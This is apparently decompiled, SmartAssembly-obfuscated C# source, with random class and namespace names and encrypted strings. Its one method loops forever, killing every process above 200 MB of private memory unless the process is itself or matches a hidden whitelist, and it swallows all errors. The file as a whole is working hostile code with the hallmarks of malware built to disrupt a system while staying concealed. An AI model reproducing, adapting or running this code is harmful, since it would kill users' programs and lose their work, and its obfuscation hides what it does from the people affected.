using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace coxZRmDhvSAWo;

public static class GhKgRcJfLpEe
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void LvjtPVltWMnr()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107397420)) && !process.ProcessName.Contains(getString_0(107397411)) && !process.ProcessName.Contains(getString_0(107397370)) && !process.ProcessName.Contains(getString_0(107397361)) && !process.ProcessName.Contains(getString_0(107397380)) && !process.ProcessName.Contains(getString_0(107397847)) && !process.ProcessName.Contains(getString_0(107397866)) && !process.ProcessName.Contains(getString_0(107397821)) && !process.ProcessName.Contains(getString_0(107397808)) && !process.ProcessName.Contains(getString_0(107397827)) && !process.ProcessName.Contains(getString_0(107397774)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static GhKgRcJfLpEe()
	{
		Strings.CreateGetStringDelegate(typeof(GhKgRcJfLpEe));
	}
}
